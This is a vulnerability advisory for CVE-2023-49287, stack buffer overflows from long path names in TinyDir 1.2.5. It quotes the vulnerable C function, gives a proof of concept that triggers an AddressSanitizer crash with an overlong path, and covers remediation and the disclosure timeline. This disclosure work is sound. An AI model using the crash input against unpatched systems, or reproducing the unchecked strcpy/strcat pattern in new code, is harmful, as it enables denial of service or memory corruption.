@@ -1,0 +1,296 @@
+id: 39179
+date: 12/04/2023
+title: TinyDir 1.2.5 Buffer Overflow Exploit
+author: Marco Ivaldi
+cves: CVE-2023-49287
+
+* Title: Buffer overflow vulnerabilities with long path names in TinyDir
+* Product: TinyDir <= 1.2.5
+* Author: Marco Ivaldi <marco.ivaldi@hnsecurity.it>
+* Date: 2023-12-04
+* CVE ID: CVE-2023-49287
+* Severity: High - 7.7 - CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H
+* Vendor URL: https://github.com/cxong/tinydir
+* Advisory URL: https://github.com/cxong/tinydir/security/advisories/GHSA-jf5r-wgf4-qhxf
+
+
+--[ 0 - Table of contents
+
+1 - Summary
+2 - Background
+3 - Vulnerabilities
+4 - Proof of concept
+5 - Affected products
+6 - Remediation
+7 - Disclosure timeline
+8 - Acknowledgements
+9 - References
+
+
+--[ 1 - Summary
+
+"This is the OG we all want to be, congrats on 20yrs of (public) vulns!"
+                                                         -- Erik Cabetas
+
+TinyDir is a lightweight, portable and easy to integrate C directory and
+file reader. It wraps dirent for POSIX and FindFirstFile for Windows.
+
+We reviewed TinyDir's source code hosted on GitHub [1] and identified some
+security vulnerabilities that may cause memory corruption. Their impacts
+range from denial of service to potential arbitrary code execution.
+
+
+--[ 2 - Background
+
+While auditing another codebase, we noticed that it included TinyDir.
+Since this small but successful project is used in hundreds of repositories
+[2], we decided to review it in search of security bugs.
+
+
+--[ 3 - Vulnerabilities
+
+We spotted some buffer overflow vulnerabilities with long path names in the
+tinydir_file_open() function, at the marked locations in the following
+source code listing:
+
+```c
+/* Open a single file given its path */
+_TINYDIR_FUNC
+int tinydir_file_open(tinydir_file *file, const _tinydir_char_t *path)
+{
+  tinydir_dir dir;
+  int result = 0;
+  int found = 0;
+  _tinydir_char_t dir_name_buf[_TINYDIR_PATH_MAX];
+  _tinydir_char_t file_name_buf[_TINYDIR_FILENAME_MAX];
+  _tinydir_char_t *dir_name;
+  _tinydir_char_t *base_name;
+#if (defined _MSC_VER || defined __MINGW32__)
+  _tinydir_char_t drive_buf[_TINYDIR_PATH_MAX];
+  _tinydir_char_t ext_buf[_TINYDIR_FILENAME_MAX];
+#endif
+
+  if (file == NULL || path == NULL || _tinydir_strlen(path) == 0)
+  {
+    errno = EINVAL;
+    return -1;
+  }
+  if (_tinydir_strlen(path) + _TINYDIR_PATH_EXTRA >= _TINYDIR_PATH_MAX)
+  {
+    errno = ENAMETOOLONG;
+    return -1;
+  }
+
+  /* Get the parent path */
+#if (defined _MSC_VER || defined __MINGW32__)
+#if ((defined _MSC_VER) && (_MSC_VER >= 1400))
+  errno = _tsplitpath_s(
+    path,
+    drive_buf, _TINYDIR_DRIVE_MAX,
+    dir_name_buf, _TINYDIR_FILENAME_MAX,
+    file_name_buf, _TINYDIR_FILENAME_MAX,
+    ext_buf, _TINYDIR_FILENAME_MAX);
+#else
+  _tsplitpath(
+    path,
+    drive_buf,
+    dir_name_buf,
+    file_name_buf,
+    ext_buf); /* VULN: potential buffer overflow due to insecure splitpath() API
+                             (https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/splitpath-wsplitpath?view=msvc-170) */
+#endif
+
+  if (errno)
+  {
+    return -1;
+  }
+
+/* _splitpath_s not work fine with only filename and widechar support */
+#ifdef _UNICODE
+  if (drive_buf[0] == L'\xFEFE')
+    drive_buf[0] = '\0';
+  if (dir_name_buf[0] == L'\xFEFE')
+    dir_name_buf[0] = '\0';
+#endif
+
+  /* Emulate the behavior of dirname by returning "." for dir name if it's
+  empty */
+  if (drive_buf[0] == '\0' && dir_name_buf[0] == '\0')
+  {
+    _tinydir_strcpy(dir_name_buf, TINYDIR_STRING("."));
+  }
+  /* Concatenate the drive letter and dir name to form full dir name */
+  _tinydir_strcat(drive_buf, dir_name_buf);
+  dir_name = drive_buf;
+  /* Concatenate the file name and extension to form base name */
+  _tinydir_strcat(file_name_buf, ext_buf); /* VULN: since sizeof(file_name_buf) + sizeof(ext_buf) is larger than
+                                                    sizeof(file_name_buf), we have a potential stack buffer overflow */
+  base_name = file_name_buf;
+#else
+  _tinydir_strcpy(dir_name_buf, path);
+  dir_name = dirname(dir_name_buf);
+  _tinydir_strcpy(file_name_buf, path); /* VULN: since sizeof(file_name_buf) is smaller than the maximum path length, 
+                                                 we have a potential stack buffer overflow */
+  base_name = basename(file_name_buf);
+#endif
+
+  /* Special case: if the path is a root dir, open the parent dir as the file */
+#if (defined _MSC_VER || defined __MINGW32__)
+  if (_tinydir_strlen(base_name) == 0)
+#else
+  if ((_tinydir_strcmp(base_name, TINYDIR_STRING("/"))) == 0)
+#endif
+  {
+    memset(file, 0, sizeof * file);
+    file->is_dir = 1;
+    file->is_reg = 0;
+    _tinydir_strcpy(file->path, dir_name);
+    file->extension = file->path + _tinydir_strlen(file->path);
+    return 0;
+  }
+
+  /* Open the parent directory */
+  if (tinydir_open(&dir, dir_name) == -1)
+  {
+    return -1;
+  }
+
+  /* Read through the parent directory and look for the file */
+  while (dir.has_next)
+  {
+    if (tinydir_readfile(&dir, file) == -1)
+    {
+      result = -1;
+      goto bail;
+    }
+    if (_tinydir_strcmp(file->name, base_name) == 0)
+    {
+      /* File found */
+      found = 1;
+      break;
+    }
+    tinydir_next(&dir);
+  }
+  if (!found)
+  {
+    result = -1;
+    errno = ENOENT;
+  }
+
+bail:
+  tinydir_close(&dir);
+  return result;
+}
+```
+
+
+--[ 4 - Proof of concept
+
+Step-by-step instructions to replicate the third vulnerability on Linux:
+
+```
+$ git clone https://github.com/cxong/tinydir
+$ cd tinydir/samples/
+$ gcc -g -fsanitize=address -I.. file_open_sample.c -o file_open_sample
+$ mkdir -p AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/
+$ ./file_open_sample AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Path: ./AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Extension: 
+Is dir? yes
+Is regular file? no
+$ ./file_open_sample AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/
+=================================================================
+==2533==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffd1ecabeb0 at pc 0x7f37b22544bf bp 0x7ffd1ecaac10 sp 0x7ffd1ecaa3b8
+WRITE of size 513 at 0x7ffd1ecabeb0 thread T0
+    #0 0x7f37b22544be in __interceptor_strcpy ../../../../src/libsanitizer/asan/asan_interceptors.cpp:440
+    #1 0x5625cf301b69 in tinydir_file_open ../tinydir.h:711
+    #2 0x5625cf3021f4 in main /home/raptor/tinydir/samples/file_open_sample.c:12
+    #3 0x7f37b1e29d8f in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
+    #4 0x7f37b1e29e3f in __libc_start_main_impl ../csu/libc-start.c:392
+    #5 0x5625cf3004e4 in _start (/home/raptor/tinydir/samples/file_open_sample+0x24e4)
+
+Address 0x7ffd1ecabeb0 is located in stack of thread T0 at offset 4704 in frame
+    #0 0x5625cf3018c3 in tinydir_file_open ../tinydir.h:641
+
+  This frame has 3 object(s):
+    [48, 4184) 'dir' (line 642)
+    [4448, 4704) 'file_name_buf' (line 646)
+    [4768, 8864) 'dir_name_buf' (line 645) <== Memory access at offset 4704 partially underflows this variable
+HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork
+      (longjmp and C++ exceptions *are* supported)
+SUMMARY: AddressSanitizer: stack-buffer-overflow ../../../../src/libsanitizer/asan/asan_interceptors.cpp:440 in __interceptor_strcpy
+Shadow bytes around the buggy address:
+  0x100023d8d780: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x100023d8d790: 00 00 00 00 00 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2
+  0x100023d8d7a0: f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2
+  0x100023d8d7b0: f2 f2 f2 f2 f2 f2 00 00 00 00 00 00 00 00 00 00
+  0x100023d8d7c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+=>0x100023d8d7d0: 00 00 00 00 00 00[f2]f2 f2 f2 f2 f2 f2 f2 00 00
+  0x100023d8d7e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x100023d8d7f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x100023d8d800: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x100023d8d810: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x100023d8d820: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+  Shadow gap:              cc
+==2533==ABORTING
+```
+
+
+--[ 5 - Affected products
+
+TinyDir 1.2.5 and earlier versions are affected by the vulnerabilities
+discussed in this advisory.
+
+
+--[ 6 - Remediation
+
+TinyDir developers have released version 1.2.6 [3] that addresses the
+vulnerabilities discussed in this advisory.
+
+Please check the official TinyDir channels for further information about
+fixes.
+
+
+--[ 7 - Disclosure timeline
+
+2023-11-30: Vulnerabilities reported via GitHub security advisories [4].
+2023-12-01: Proof of concept provided at the request of TinyDir developers.
+2023-12-02: Vulnerabilities fixed in TinyDir's master branch on GitHub.
+2023-12-03: TinyDir 1.2.6 released and GitHub advisory published.
+2023-12-04: GitHub issued CVE-2023-49287 and we published this advisory.
+
+
+--[ 8 - Acknowledgements
+
+We would like to thank TinyDir developers for triaging and quickly fixing
+the reported vulnerabilities.
+
+
+--[ 9 - References
+
+[1] https://github.com/cxong/tinydir
+[2] https://github.com/search?q=tinydir.h&type=code
+[3] https://github.com/cxong/tinydir/releases/tag/1.2.6
+[4] https://github.com/cxong/tinydir/security
+
+#  0day.today [2023-12-10]  #
